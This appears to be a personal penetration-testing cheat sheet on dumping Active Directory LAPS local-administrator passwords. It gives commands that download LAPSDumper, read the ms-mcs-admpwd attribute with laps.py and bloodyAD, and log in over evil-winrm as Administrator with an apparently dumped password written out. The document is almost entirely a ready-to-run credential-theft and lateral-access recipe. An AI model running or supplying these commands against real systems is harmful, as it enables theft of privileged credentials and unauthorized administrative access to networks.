#### Using laps.py
```shell
wget https://github.com/n00py/LAPSDumper/raw/refs/heads/main/laps.py
```
#### Using LAPSDumper from Linux to Read the LAPS Password
```shell
python3 laps.py -u <USER> -p <PASSWORD> -l <TARGET-IP> -d Domain.local
```
![[Pasted image 20260101213236.png]]
#### **Not to forget** Username that will be used on laps password is **Administrator**

---
#### Using `bloodyAD`
```shell
bloodyAD --host <TARGET-IP> -d domain.local -u <USER> -p <PASSWORD> get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```
![[Pasted image 20260101213108.png]]

---
#### Access
```shell
evil-winrm -S -i <TARGET-IP> -u Administrator -p "6vf8f0T4a+2[@Mu1[6g66pHj"
```
